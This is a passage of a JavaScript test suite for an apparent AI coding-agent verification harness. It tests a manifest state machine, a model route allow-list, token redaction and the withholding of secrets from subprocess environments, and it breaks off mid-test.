import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import {
  chmod,
  cp,
  mkdtemp,
  readFile,
  rm,
  stat,
  writeFile,
} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';
import {
  assertFrozenTuple,
  assertNoUnexpectedDelta,
  auditManifestCompleteness,
  canonicalJson,
  cliFallbackParityDigest,
  compareLongFile,
  freezeManifest,
  invalidateManifest,
  loadManifest,
  newManifest,
  NEGATIVE_CASE_REGISTRY,
  redactText,
  runCommand,
  saveManifest,
  sha256,
  SOURCE_REVISION_PATCH_SHA256,
  scoreDocument,
  transition,
  validateManifest,
  validateRoute,
} from './lib.mjs';

const execFileAsync = promisify(execFile);
const root = path.dirname(fileURLToPath(import.meta.url));
const sha = '0123456789abcdef0123456789abcdef01234567';
const gitSha = (character) => character.repeat(40);
const digest = (character) => character.repeat(64);
const frozenRequest = Object.freeze({
  userRequest: 'Add a tested category filter.',
  source: 'GITHUB_EXISTING',
  repoMode: 'EXISTING',
  executionMode: 'PRODUCTION',
  skipApproval: false,
  autoMerge: false,
  aiProvider: 'DEEPSEEK',
  modelName: 'deepseek-v4-pro-native',
  projectId: 'project-1',
  selectedRepoIds: ['repo-1'],
  tddMode: false,
  skipAutoPush: false,
  requireConfirmationBeforeExpensiveContinuation: true,
  requireBenchmarkPriorForAutomaticContinuation: false,
  userCostCap: 3,
});
const frozenRequestDigest = sha256(canonicalJson(frozenRequest));
const preflightEvidence = (runningSha = gitSha('a')) => ({
  expectedSha: gitSha('a'),
  deployedSha: gitSha('a'),
  runningSha,
  runningShaAuthority: 'DEPLOYMENT_HOST:/opt/app/RUNNING_SHA',
  health: 'UP',
  deployWorkflowRunId: '12345',
  deployWorkflowRunUrl: 'https://github.com/owner/server/actions/runs/12345',
  deployConclusion: 'SUCCESS',
  providerState: 'READY',
  providerPolicyEvidenceId: 'policy-1',
  ghAuth: 'VERIFIED',
});

const sandboxEvidence = (overrides = {}) => ({
  mode: 'REMOTE_WORKSPACE_ONLY',
  projectId: 'project-1',
  capabilitySnapshot: {
    lifecycleEnabled: false,
    runtimeDispatchEnabled: false,
    containerStrictV1Enabled: false,
    toolchainReadinessEnabled: false,
  },
  capabilityEvidenceId: 'client-capabilities-1',
  projectInteraction: {
    classification: 'INTENTIONAL_SEPARATION',
    createOrLinkInsideAgentAvailable: false,
    handoffAvailable: true,
    evidenceId: 'project-handoff-1',
  },
  execution: {
    sandboxCreated: false,
    hostFallbackUsed: false,
    truthfulLabel: 'Remote workspace',
    doNotDemo: true,
    limitation: 'Strict isolated sandbox is disabled in dev.',
    projectContextPreserved: true,
    historySnapshotAvailable: true,
    closeAvailable: true,
    evidenceId: 'remote-workspace-1',
  },
  teardown: {
    mode: 'REMOTE_WORKSPACE_ONLY',
    projectId: 'project-1',
    sourceSha: gitSha('b'),
    sandboxAbsent: true,
    workspaceClosed: true,
    evidenceId: 'workspace-close-1',
  },
  ...overrides,
});

function cliFallbackEvidence(manifest) {
  const surfaceNames = ['tui', 'plain', 'stdin', 'text', 'json', 'streamJson'];
  const evidence = {
    cliSha: gitSha('e'),
    heroRunIds: ['hero-run-1', 'hero-run-2', 'hero-run-3'],
    auth: {
      patAuthenticated: true,
      capabilitiesLoaded: true,
      evidenceId: 'cli-auth-1',
    },
    surfaces: {
      outputDigests: Object.fromEntries(
        surfaceNames.map((name, index) => [name, digest('123456'[index])]),
      ),
      normalizedResultDigests: Object.fromEntries(
        surfaceNames.map((name) => [name, digest('a')]),
      ),
      evidenceId: 'cli-surfaces-1',
    },
    crossSurface: {
      createdRunId: 'hero-run-1',
      approvedRunId: 'hero-run-1',
      createdBy: 'WEB',
      approvedBy: 'CLI',
      approvalReceiptId: 'approval-1',
      sameRun: true,
      evidenceId: 'cli-cross-surface-1',
    },
    attach: {
      runId: 'hero-run-2',
      cursor: 'event-cursor-2',
      deduplicated: true,
      evidenceId: 'cli-attach-1',
    },
    sigint: {
      exitCode: 130,
      serverCancelRequestsDelta: 0,
      evidenceId: 'cli-sigint-1',
    },
    provenance: {
      provider: 'DEEPSEEK',
      model: 'deepseek-v4-pro-native',
      costVisible: true,
      evidenceVisible: true,
      prCiVisible: true,
      evidenceId: 'cli-provenance-1',
    },
    localHands: {
      httpStatus: 403,
      terminalCode: 'LOCAL_HANDS_DENIED',
      providerCallsDelta: 0,
      chargeUsdDelta: 0,
      codeChangesDelta: 0,
      prCountDelta: 0,
      evidenceId: 'cli-local-hands-1',
    },
    cwd: {
      requestedPath: '/tmp/litmus',
      canonicalPath: '/private/tmp/litmus',
      realpathBound: true,
      headSha: gitSha('c'),
      manifestSha256: digest('e'),
      evidenceId: 'cli-cwd-1',
    },
    toolPolicy: {
      readAllowed: true,
      shellDeniedWithoutApproval: true,
      mutationDeniedWithoutApproval: true,
      explicitApprovalRequired: true,
      evidenceId: 'cli-tool-policy-1',
    },
    verification: {
      buildPassed: true,
      trackedCliTestsPassed: true,
      heavyTuiPassed: true,
      windowsSmokePassed: true,
      evidenceId: 'cli-verification-1',
    },
    parityDigest: '',
  };
  evidence.parityDigest = cliFallbackParityDigest(evidence, manifest);
  return evidence;
}

function baselineEvidence(sourceSha, suffix, extra = {}) {
  return {
    architectureVersionId: `architecture-${suffix}`,
    sourceSha,
    codeMapEvidenceId: `codemap-${suffix}`,
    architectureEvidenceId: `architecture-proof-${suffix}`,
    documentEvidenceId: `document-${suffix}`,
    documentRubricPass: true,
    documentScore: 90,
    documentMaxScore: 100,
    documentSourceSha: sourceSha,
    documentProvider: 'DEEPSEEK',
    documentModel: 'deepseek-v4-pro-native',
    documentOperationId: `document-operation-${suffix}`,
    ...extra,
  };
}

function frozenCampaign() {
  const request = { ...frozenRequest };
  let manifest = newManifest({
    runRequest: {
      ...request,
      requirementSha256: sha256(request.userRequest),
      canonicalJsonSha256: sha256(canonicalJson(request)),
    },
  });
  manifest = transition(manifest, 'PREFLIGHTED', preflightEvidence());
  manifest = transition(manifest, 'FIXTURE_CREATED', {
    repoFullName: 'owner/litmus',
    baseBranch: 'main',
    visibility: 'PRIVATE',
    baseSha: gitSha('b'),
  });
  manifest = transition(manifest, 'PROJECT_LINKED', {
    projectId: 'project-1',
    repoId: 'repo-1',
    linkEvidenceId: 'link-1',
  });
  manifest = transition(manifest, 'SANDBOX_ASSESSED', sandboxEvidence());
  manifest = transition(
    manifest,
    'BASELINE_V1_READY',
    baselineEvidence(gitSha('b'), 'v1'),
  );
  manifest = transition(manifest, 'SOURCE_REVISION_PUSHED', {
    previousSha: gitSha('b'),
    currentBaseSha: gitSha('c'),
    patchSha256: SOURCE_REVISION_PATCH_SHA256,
    changedPaths: ['src/catalog.js', 'test/baseline.test.js'],
    checkName: 'fixture-ci',
    checkConclusion: 'SUCCESS',
    ciEvidenceId: 'revision-ci-1',
    pushEvidenceId: 'push-1',
  });
  manifest = transition(
    manifest,
    'BASELINE_V2_READY',
    baselineEvidence(gitSha('c'), 'v2', {
      webSha: gitSha('d'),
      cliSha: gitSha('e'),
      decisionContractSha256: digest('3'),
      compareFromVersionId: 'architecture-v1',
      compareToVersionId: 'architecture-v2',
      contentDiffPass: true,
      fileDiffOnly: false,
      contentDiffSha256: digest('a'),
      expectedChangedLineEvidenceId: 'changed-line-1',
      semanticErrorCode: 'OWN_KEYS_OPENAI_CREDENTIAL_UNAVAILABLE',
      ripgrepAvailable: true,
      semanticProviderCallsDelta: 0,
      semanticFallbackEvidenceId: 'semantic-fallback-1',
      runRequest: { ...frozenRequest },
    }),
  );
  return freezeManifest(manifest);
}

function heroProof(ordinal) {
  const hex = ['4', '5', '6'][ordinal - 1];
  return {
    ordinal,
    runId: `hero-run-${ordinal}`,
    branch: `executespec/hero-${ordinal}`,
    sourceSha: gitSha('c'),
    requestSha256: frozenRequestDigest,
    status: 'COMPLETE',
    plan: { planId: `plan-${ordinal}`, version: 1, fingerprint: digest(hex) },
    approvalReceiptId: `approval-${ordinal}`,
    task: {
      total: 2,
      completed: 2,
      failed: 0,
      buildPassed: true,
      evidenceId: `task-${ordinal}`,
    },
    files: {
      changed: ['src/catalog.js', 'test/catalog.test.js'],
      generatedCodeSha256: digest(hex),
    },
    tests: { passed: 4, failed: 0, skipped: 0, behaviorVerified: true },
    review: {
      truthful: true,
      verifiedScore: 94,
      evidenceId: `review-${ordinal}`,
    },
    pr: {
      number: 100 + ordinal,
      url: `https://github.com/owner/litmus/pull/${100 + ordinal}`,
      branch: `executespec/hero-${ordinal}`,
      baseSha: gitSha('c'),
      headSha: gitSha(hex),
      ci: {
        checkName: 'fixture-ci',
        conclusion: 'SUCCESS',
        totalChecks: 1,
        headSha: gitSha(hex),
      },
    },
    cost: { actualUsd: 0.4 + ordinal / 10, capUsd: 3, bounded: true },
    route: {
      provider: 'DEEPSEEK',
      model: 'deepseek-v4-pro-native',
      routingMode: 'EXACT_LOCK',
    },
    routeCalls: [
      {
        callId: `planner-${ordinal}`,
        provider: 'DEEPSEEK',
        model: 'deepseek-v4-pro-native',
        agentRole: 'PLANNER',
        noFallback: true,
      },
      {
        callId: `worker-${ordinal}`,
        provider: 'DEEPSEEK',
        model: 'deepseek-v4-pro-native',
        agentRole: 'WORKER',
        noFallback: true,
      },
      {
        callId: `reviewer-${ordinal}`,
        provider: 'DEEPSEEK',
        model: 'deepseek-v4-pro-native',
        agentRole: 'REVIEWER',
        noFallback: true,
      },
    ],
    longFile: {
      byteExact: true,
      lines: 182,
      sentinelPresent: true,
      workspaceSha256: digest(hex),
      prSha256: digest(hex),
      pass: true,
    },
    reconnect: {
      sseRecovered: true,
      reloadStable: true,
      evidenceId: `reconnect-${ordinal}`,
    },
    parity: { web: true, cli: true, terminalOutcomeDigest: digest(hex) },
    terminal: {
      onePrimaryAction: true,
      actionCode: 'OPEN_PULL_REQUEST',
      supportCode: `support-${ordinal}`,
      webCliParity: true,
      evidenceId: `terminal-${ordinal}`,
    },
    correctnessEvidenceId: `correctness-${ordinal}`,
  };
}

function negativeCases() {
  return Object.entries(NEGATIVE_CASE_REGISTRY).map(([caseId, rule], index) =>
    rule.publiclyExecutable
      ? {
          caseId,
          status: 'VERIFIED',
          httpStatus: rule.statuses[0],
          terminalCode: rule.sseCode ?? `SAFE_${caseId}`,
          controlled: true,
          providerCallsDelta: 0,
          chargeUsdDelta: 0,
          codeChangesDelta: 0,
          prCountDelta: 0,
          snapshotBeforeSha256: digest('0123456789abcdef'[index % 16]),
          snapshotAfterSha256: digest('0123456789abcdef'[index % 16]),
          oneAction: true,
          rawLeakAbsent: true,
          webCliParity: true,
          deltaEvidenceId: `delta-${index}`,
          ...(rule.sseCode
            ? {
                sseCode: rule.sseCode,
                clientStatus: rule.clientStatuses[0],
                category: rule.category,
                retryable: true,
                nextAction: 'Adjust the governed budget before retrying.',
              }
            : {}),
        }
      : {
          caseId,
          status: 'NOT_RUN',
          unsupportedReason: 'Requires an operator-provisioned corrupt row',
          requiredAuthority: 'SUPER_ADMIN database fixture',
          owner: 'litmus operator',
        },
  );
}

function throughHeroes() {
  let manifest = frozenCampaign();
  for (let ordinal = 1; ordinal <= 3; ordinal += 1) {
    manifest = transition(manifest, `HERO_${ordinal}_RUNNING`, {
      ordinal,
      runId: `hero-run-${ordinal}`,
      branch: `executespec/hero-${ordinal}`,
      sourceSha: gitSha('c'),
      requestSha256: frozenRequestDigest,
      submittedEvidenceId: `submitted-${ordinal}`,
    });
    manifest = transition(
      manifest,
      `HERO_${ordinal}_VERIFIED`,
      heroProof(ordinal),
    );
  }
  return transition(
    manifest,
    'CLI_FALLBACK_VERIFIED',
    cliFallbackEvidence(manifest),
  );
}

function throughVerifiedHeroes() {
  let manifest = frozenCampaign();
  for (let ordinal = 1; ordinal <= 3; ordinal += 1) {
    manifest = transition(manifest, `HERO_${ordinal}_RUNNING`, {
      ordinal,
      runId: `hero-run-${ordinal}`,
      branch: `executespec/hero-${ordinal}`,
      sourceSha: gitSha('c'),
      requestSha256: frozenRequestDigest,
      submittedEvidenceId: `submitted-${ordinal}`,
    });
    manifest = transition(
      manifest,
      `HERO_${ordinal}_VERIFIED`,
      heroProof(ordinal),
    );
  }
  return manifest;
}

function throughNegatives() {
  let manifest = throughCiFix();
  manifest = transition(manifest, 'DEPLOYMENT_TRACKED', {
    deploymentId: 'deployment-1',
    sourceSha: gitSha('9'),
    status: 'SUCCEEDED',
    trackingEvidenceId: 'deploy-track-1',
  });
  return transition(manifest, 'NEGATIVES_VERIFIED', { cases: negativeCases() });
}

function throughCiFix() {
  let manifest = throughHeroes();
  manifest = transition(manifest, 'HERO_PR_MERGED', {
    heroOrdinal: 1,
    runId: 'hero-run-1',
    prNumber: 101,
    preMergeSha: gitSha('c'),
    mergedSha: gitSha('7'),
    mergeEvidenceId: 'merge-1',
  });
  manifest = transition(manifest, 'MERGED_SHA_REFRESHED', {
    observedMainSha: gitSha('7'),
    workspaceSha: gitSha('7'),
    architectureSourceSha: gitSha('7'),
    exactContentSha256: digest('7'),
    stalePublishPrevented: true,
    refreshEvidenceId: 'refresh-1',
  });
  manifest = transition(manifest, 'CONTINUATION_VERIFIED', {
    runId: 'continuation-1',
    parentRunId: 'hero-run-1',
    sourceSha: gitSha('7'),
    status: 'COMPLETE',
    testsPassed: 5,
    testsFailed: 0,
    prNumber: 104,
    continuationEvidenceId: 'continue-1',
  });
  manifest = transition(manifest, 'CI_FAILURE_CREATED', {
    prNumber: 104,
    headSha: gitSha('8'),
    checkName: 'fixture-ci',
    conclusion: 'FAILURE',
    testContractSha256: digest('8'),
    failureEvidenceId: 'ci-failure-1',
  });
  return transition(manifest, 'CI_FIX_VERIFIED', {
    fixRunId: 'ci-fix-run-1',
    prNumber: 104,
    headSha: gitSha('9'),
    checkName: 'fixture-ci',
    conclusion: 'SUCCESS',
    totalChecks: 1,
    testsPassed: 5,
    testsFailed: 0,
    testContractSha256: digest('8'),
    testsWeakened: false,
    fixEvidenceId: 'ci-fix-1',
  });
}

function completeCampaign({ skipDeployment = false } = {}) {
  let manifest = throughCiFix();
  manifest = skipDeployment
    ? transition(manifest, 'DEPLOYMENT_SKIPPED', {
        decisionId: 'deploy-decision-1',
        reason: 'Demo scope explicitly excludes fixture deployment',
        deploymentCreated: false,
        trackingChecked: true,
      })
    : transition(manifest, 'DEPLOYMENT_TRACKED', {
        deploymentId: 'deployment-1',
        sourceSha: gitSha('9'),
        status: 'SUCCEEDED',
        trackingEvidenceId: 'deploy-track-1',
      });
  manifest = transition(manifest, 'NEGATIVES_VERIFIED', {
    cases: negativeCases(),
  });
  manifest = transition(manifest, 'CLEANUP_REQUIRED', {
    reason: 'Campaign finished',
    cleanupPlanId: 'cleanup-plan-1',
  });
  manifest = transition(manifest, 'CLEANUP_VERIFIED', {
    githubRepo: 'owner/litmus',
    githubAbsent: true,
    executespecProjectId: 'project-1',
    projectAbsent: true,
    repositoryLinkAbsent: true,
    executespecRepositoryAbsent: true,
    sandboxAbsent: true,
    runsAbsent: true,
    deploymentAbsent: true,
    remoteBranchesAbsent: true,
    localArtifactsRemoved: true,
    cleanupEvidenceId: 'cleanup-proof-1',
  });
  return transition(manifest, 'COMPLETE', {
    auditId: 'audit-1',
    auditor: 'independent-local-verifier',
    pass: true,
  });
}

test('route allow-list accepts only native DeepSeek and Fireworks GLM 5.2', () => {
  assert.deepEqual(validateRoute('deepseek', 'deepseek-v4-pro-native'), {
    provider: 'DEEPSEEK',
    model: 'deepseek-v4-pro-native',
  });
  assert.deepEqual(validateRoute('FIREWORKS', 'glm-5.2-fw'), {
    provider: 'FIREWORKS',
    model: 'glm-5.2-fw',
  });
  assert.throws(() => validateRoute('OPENAI', 'gpt-5.4'), /restricted/);
  assert.throws(
    () => validateRoute('FIREWORKS', 'deepseek-v4-pro-native'),
    /restricted/,
  );
  assert.throws(() => validateRoute('DEEPSEEK', 'glm-5.2-fw'), /restricted/);
});

test('redaction removes tokens from text while retaining safe structure', () => {
  const text = redactText(
    'Authorization: Bearer secret-value https://x.test?a=1&token=abc ghp_abcdefghijklmnopqrstuvwxyz',
  );
  assert.doesNotMatch(text, /secret-value|token=abc|ghp_/);
  assert.match(text, /Bearer \[REDACTED\]/);
  assert.match(text, /token=\[REDACTED\]/);
});

test('subprocesses receive only the safe environment allow-list', async () => {
  const { stdout } = await runCommand(
    process.execPath,
    ['-e', 'process.stdout.write(JSON.stringify(process.env))'],
    {
      env: {
        PATH: process.env.PATH,
        HOME: process.env.HOME,
        EXECUTESPEC_LITMUS_ACCESS_TOKEN: 'es_pat_must_not_reach_child',
        FIREWORKS_API_KEY: 'fw_must_not_reach_child',
      },
    },
  );
  const childEnv = JSON.parse(stdout);
  assert.equal(childEnv.EXECUTESPEC_LITMUS_ACCESS_TOKEN, undefined);
  assert.equal(childEnv.FIREWORKS_API_KEY, undefined);
  assert.equal(childEnv.HOME, process.env.HOME);
});

test('state machine permits the next state and rejects skips', () => {
  const manifest = newManifest();
  assert.throws(
    () => validateManifest({ ...manifest, schemaVersion: 2 }),
    /clean up its recorded resources with the v2 harness revision/,
  );
  assert.equal(
    transition(manifest, 'PREFLIGHTED', preflightEvidence()).state,
    'PREFLIGHTED',
  );
  assert.throws(
    () => transition(manifest, 'PROJECT_LINKED'),
    /Illegal litmus transition/,
  );
  assert.throws(
    () => transition(manifest, 'PREFLIGHTED', { health: 'UP' }),
    /missing/,
  );
  assert.throws(
    () => transition(manifest, 'PREFLIGHTED', preflightEvidence(gitSha('b'))),
    /mismatch/,
  );
  assert.throws(
    () => validateManifest({ ...manifest, unexpected: true }),
    /Unknown manifest fields/,
  );
});

test('reload validation binds every state to its exact reachable evidence', () => {
  const heroThree = throughVerifiedHeroes();
  const missingHero = structuredClone(heroThree);
  missingHero.heroes.pop();
  assert.throws(
    () => validateManifest(missingHero),
    /HERO_3_VERIFIED.*3 verified heroes/,
  );

  const running = transition(frozenCampaign(), 'HERO_1_RUNNING', {
    ordinal: 1,
    runId: 'hero-run-1',
    branch: 'executespec/hero-1',
    sourceSha: gitSha('c'),
    requestSha256: frozenRequestDigest,
    submittedEvidenceId: 'submitted-1',
  });
  delete running.postMerge.pendingHero;
  assert.throws(
    () => validateManifest(running),
    /HERO_1_RUNNING\.postMerge is missing: pendingHero/,
  );

  const missingCli = structuredClone(throughHeroes());
  missingCli.cliFallback = {};
  assert.throws(
    () => validateManifest(missingCli),
    /CLI_FALLBACK_VERIFIED is missing/,
  );

  const cleanup = transition(throughNegatives(), 'CLEANUP_REQUIRED', {
    reason: 'Campaign finished',
    cleanupPlanId: 'cleanup-plan-1',
  });
  cleanup.cleanup.required.stateEvidenceDigest = digest('f');
  assert.throws(
    () => validateManifest(cleanup),
    /CLEANUP_REQUIRED stateEvidenceDigest contradicts evidence/,
  );

  const invalidated = invalidateManifest(
    frozenCampaign(),
    'deployment changed',
  );
  invalidated.invalidation.stateEvidenceDigest = digest('f');
  assert.throws(
    () => validateManifest(invalidated),
    /INVALIDATED stateEvidenceDigest contradicts evidence/,
  );

  const malformedMerge = throughCiFix();
  malformedMerge.postMerge.merge.preMergeSha = gitSha('1');
  assert.throws(
    () => validateManifest(malformedMerge),
    /Merged SHA must advance frozen main/,
  );

  const malformedRefresh = throughCiFix();
  malformedRefresh.postMerge.refresh.stalePublishPrevented = false;
  assert.throws(
    () => validateManifest(malformedRefresh),
    /stalePublishPrevented must be true/,
  );

  const malformedContinuation = throughCiFix();
  malformedContinuation.postMerge.continuation.testsFailed = 1;
  assert.throws(
    () => validateManifest(malformedContinuation),
    /Continuation tests must pass/,
  );

  const malformedCiFailure = throughCiFix();
  malformedCiFailure.postMerge.ciFailure.conclusion = 'SUCCESS';
  assert.throws(
    () => validateManifest(malformedCiFailure),
    /CI failure must identify failed fixture-ci/,
  );

  const malformedCiFix = throughCiFix();
  malformedCiFix.postMerge.ciFix.totalChecks = 2;
  assert.throws(
    () => validateManifest(malformedCiFix),
    /CI fix must green the same PR with one fixture-ci check/,
  );

  const malformedDeployment = throughNegatives();
  malformedDeployment.postMerge.deployment.status = 'FAILED';
  assert.throws(
    () => validateManifest(malformedDeployment),
    /Tracked deployment must succeed for the CI-fixed SHA/,
  );

  const malformedSkippedDeployment = completeCampaign({
    skipDeployment: true,
  });
  malformedSkippedDeployment.postMerge.deployment.deploymentCreated = true;
  assert.throws(
    () => validateManifest(malformedSkippedDeployment),
    /DEPLOYMENT_SKIPPED\.deploymentCreated must be false/,
  );
});

test('freeze binds the exact deployment, fixture, project, route and request tuple', () => {
  const frozen = frozenCampaign();
  assert.equal(frozen.state, 'FROZEN');
  assert.equal(assertFrozenTuple(frozen), frozen.frozenTupleDigest);
  assert.equal(frozen.runRequest.projectId, 'project-1');
  assert.deepEqual(frozen.runRequest.selectedRepoIds, ['repo-1']);
  const changed = structuredClone(frozen);
  changed.route.model = 'deepseek-v4-flash-native';
  assert.throws(() => assertFrozenTuple(changed), /digest mismatch/);
  assert.throws(() => transition(changed, 'HERO_1_RUNNING'), /digest mismatch/);

  const changedRequest = structuredClone(frozen);
  changedRequest.runRequest.selectedRepoIds = ['repo-2'];
  assert.throws(() => assertFrozenTuple(changedRequest), /digest mismatch/);
  const missingClient = structuredClone(frozen);
  missingClient.state = 'BASELINE_V2_READY';
  missingClient.frozenTupleDigest = null;
  delete missingClient.clients.cliSha;
  assert.throws(() => freezeManifest(missingClient), /clients.cliSha/);

  const beforeV2 = structuredClone(frozen);
  beforeV2.state = 'SOURCE_REVISION_PUSHED';
  beforeV2.frozenTupleDigest = null;
  delete beforeV2.project.baselineV2;
  beforeV2.clients = {};
  beforeV2.approval.decisionContractSha256 = '';
  const badCompare = baselineEvidence(gitSha('c'), 'v2', {
    webSha: gitSha('d'),
    cliSha: gitSha('e'),
    decisionContractSha256: digest('3'),
    compareFromVersionId: 'wrong-version',
    compareToVersionId: 'architecture-v2',
    contentDiffPass: true,
    fileDiffOnly: false,
    contentDiffSha256: digest('a'),
    expectedChangedLineEvidenceId: 'changed-line-1',
    semanticErrorCode: 'OWN_KEYS_OPENAI_CREDENTIAL_UNAVAILABLE',
    ripgrepAvailable: true,
    semanticProviderCallsDelta: 0,
    semanticFallbackEvidenceId: 'semantic-1',
    runRequest: { ...frozenRequest },
  });
  assert.throws(
    () => transition(beforeV2, 'BASELINE_V2_READY', badCompare),
    /Compare History versions/,
  );
});

test('full evidence sequence reaches COMPLETE only with three distinct verified heroes and all post-run proof', () => {
  const complete = completeCampaign();
  assert.equal(complete.state, 'COMPLETE');
  assert.equal(complete.heroes.length, 3);
  assert.deepEqual(
    complete.heroes.map((hero) => hero.sourceSha),
    [gitSha('c'), gitSha('c'), gitSha('c')],
  );
  assert.equal(complete.postMerge.refresh.observedMainSha, gitSha('7'));
  assert.equal(complete.postMerge.continuation.status, 'COMPLETE');
  assert.equal(complete.postMerge.ciFix.testsWeakened, false);
  assert.equal(complete.postMerge.deployment.mode, 'TRACKED');
  assert.equal(
    complete.negatives.length,
    Object.keys(NEGATIVE_CASE_REGISTRY).length,
  );
  const audit = auditManifestCompleteness(complete);
  assert.equal(audit.goEligible, false);
  assert.equal(complete.cleanup.audit.goEligible, false);
  assert.deepEqual(
    complete.cleanup.audit.nonPassNegativeCases,
    audit.nonPassNegativeCases,
  );
  assert.deepEqual(
    audit.nonPassNegativeCases,
    Object.entries(NEGATIVE_CASE_REGISTRY)
      .filter(([, rule]) => !rule.publiclyExecutable)
      .map(([caseId]) => caseId),
  );
  assert.deepEqual(audit.nonPassRequirements, [
    'SANDBOX_STRICT_RUNTIME_UNAVAILABLE',
  ]);
  assert.deepEqual(
    complete.cleanup.audit.nonPassRequirements,
    audit.nonPassRequirements,
  );
});

test('sandbox assessment is authoritative and remote-workspace-only evidence blocks GO', () => {
  let manifest = newManifest();
  manifest = transition(manifest, 'PREFLIGHTED', preflightEvidence());
  manifest = transition(manifest, 'FIXTURE_CREATED', {
    repoFullName: 'owner/litmus',
    baseBranch: 'main',
    visibility: 'PRIVATE',
    baseSha: gitSha('b'),
  });
  manifest = transition(manifest, 'PROJECT_LINKED', {
    projectId: 'project-1',
    repoId: 'repo-1',
    linkEvidenceId: 'link-1',
  });
  assert.throws(
    () =>
      transition(
        manifest,
        'BASELINE_V1_READY',
        baselineEvidence(gitSha('b'), 'v1'),
      ),
    /Illegal litmus transition/,
  );
  const assessed = transition(manifest, 'SANDBOX_ASSESSED', sandboxEvidence());
  assert.equal(
    assessed.sandboxJourney.execution.truthfulLabel,
    'Remote workspace',
  );
  const falseSandbox = sandboxEvidence({
    mode: 'STRICT_REMOTE_SANDBOX',
    execution: {
      sandboxId: 'sandbox-1',
      imageDigest: `fixture@sha256:${digest('a')}`,
      runtimeEpoch: 'epoch-1',
      leaseId: 'lease-1',
      sourceSha: gitSha('b'),
      workspaceMount: '/workspace',
      uid: 65532,
      gid: 65532,
      noHostFallback: true,
      commandPassed: true,
      buildPassed: true,
      testsPassed: true,
      projectContextPreserved: true,
      historyReloadPassed: true,
      closePassed: true,
      evidenceId: 'sandbox-exec-1',
    },
  });
  assert.throws(
    () => transition(manifest, 'SANDBOX_ASSESSED', falseSandbox),
    /every sandbox capability/,
  );
  const wrongTeardown = sandboxEvidence();
  wrongTeardown.teardown.projectId = 'another-project';
  assert.throws(
    () => transition(manifest, 'SANDBOX_ASSESSED', wrongTeardown),
    /teardown contradicts/,
  );
});

test('CLI fallback proof binds all heroes and fails closed on missing surfaces or cancellation', () => {
  const verified = throughHeroes();
  assert.equal(verified.state, 'CLI_FALLBACK_VERIFIED');
  assert.deepEqual(
    verified.cliFallback.heroRunIds,
    verified.heroes.map((hero) => hero.runId),
  );

  let beforeCli = frozenCampaign();
  for (let ordinal = 1; ordinal <= 3; ordinal += 1) {
    beforeCli = transition(beforeCli, `HERO_${ordinal}_RUNNING`, {
      ordinal,
      runId: `hero-run-${ordinal}`,
      branch: `executespec/hero-${ordinal}`,
      sourceSha: gitSha('c'),
      requestSha256: frozenRequestDigest,
      submittedEvidenceId: `submitted-${ordinal}`,
    });
    beforeCli = transition(
      beforeCli,
      `HERO_${ordinal}_VERIFIED`,
      heroProof(ordinal),
    );
  }
  const missingSurface = cliFallbackEvidence(beforeCli);
  delete missingSurface.surfaces.outputDigests.stdin;
  assert.throws(
    () => transition(beforeCli, 'CLI_FALLBACK_VERIFIED', missingSurface),
    /outputDigests.*missing: stdin/,
  );
  const cancellingAttach = cliFallbackEvidence(beforeCli);
  cancellingAttach.sigint.serverCancelRequestsDelta = 1;
  assert.throws(
    () => transition(beforeCli, 'CLI_FALLBACK_VERIFIED', cancellingAttach),
    /without cancelling/,
  );
  const divergentFormats = cliFallbackEvidence(beforeCli);
  divergentFormats.surfaces.normalizedResultDigests.json = digest('b');
  assert.throws(
    () => transition(beforeCli, 'CLI_FALLBACK_VERIFIED', divergentFormats),
    /normalize to the same result/,
  );
  const forgedParity = cliFallbackEvidence(beforeCli);
  forgedParity.parityDigest = digest('0');
  assert.throws(
    () => transition(beforeCli, 'CLI_FALLBACK_VERIFIED', forgedParity),
    /does not bind surface and hero outcomes/,
  );

  const persisted = throughHeroes();
  persisted.cliFallback = {};
  assert.throws(() => validateManifest(persisted), /CLI_FALLBACK_VERIFIED/);
});

test('truthful deployment skip is complete only with explicit no-deployment evidence', () => {
  const complete = completeCampaign({ skipDeployment: true });
  assert.equal(complete.postMerge.deployment.mode, 'SKIPPED');
  assert.equal(complete.postMerge.deployment.deploymentCreated, false);
  assert.throws(
    () =>
      transition(throughCiFix(), 'DEPLOYMENT_SKIPPED', {
        decisionId: 'decision',
        reason: 'skip',
        deploymentCreated: true,
        trackingChecked: true,
      }),
    /must be false/,
  );
});

test('hero omissions, duplicates, contradictions and arbitrary evidence fail closed', () => {
  const frozen = frozenCampaign();
  const running = transition(frozen, 'HERO_1_RUNNING', {
    ordinal: 1,
    runId: 'hero-run-1',
    branch: 'executespec/hero-1',
    sourceSha: gitSha('c'),
    requestSha256: frozenRequestDigest,
    submittedEvidenceId: 'submit-1',
  });
  const missing = heroProof(1);
  delete missing.longFile;
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', missing),
    /missing: longFile/,
  );
  const contradiction = heroProof(1);
  contradiction.sourceSha = gitSha('b');
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', contradiction),
    /frozen fixture base/,
  );
  const arbitrary = { ...heroProof(1), madeUpPass: true };
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', arbitrary),
    /unknown fields/,
  );
  const staleBase = heroProof(1);
  staleBase.pr.baseSha = gitSha('b');
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', staleBase),
    /PR branch\/base/,
  );
  const fallback = heroProof(1);
  fallback.routeCalls[1].noFallback = false;
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', fallback),
    /noFallback must be true/,
  );
  const twoActions = heroProof(1);
  twoActions.terminal.onePrimaryAction = false;
  assert.throws(
    () => transition(running, 'HERO_1_VERIFIED', twoActions),
    /onePrimaryAction must be true/,
  );

  let afterOne = transition(running, 'HERO_1_VERIFIED', heroProof(1));
  assert.throws(
    () =>
      transition(afterOne, 'HERO_2_RUNNING', {
        ordinal: 2,
        runId: 'hero-run-1',
        branch: 'executespec/hero-2',
        sourceSha: gitSha('c'),
        requestSha256: frozenRequestDigest,
        submittedEvidenceId: 'submit-2',
      }),
    /Duplicate hero run/,
  );
});

test('post-merge, CI, negative and cleanup contradictions cannot reach completion', () => {
  let manifest = throughHeroes();
  assert.throws(
    () =>
      transition(manifest, 'HERO_PR_MERGED', {
        heroOrdinal: 1,
        runId: 'hero-run-2',
        prNumber: 101,
        preMergeSha: gitSha('c'),
        mergedSha: gitSha('7'),
        mergeEvidenceId: 'bad-merge',
      }),
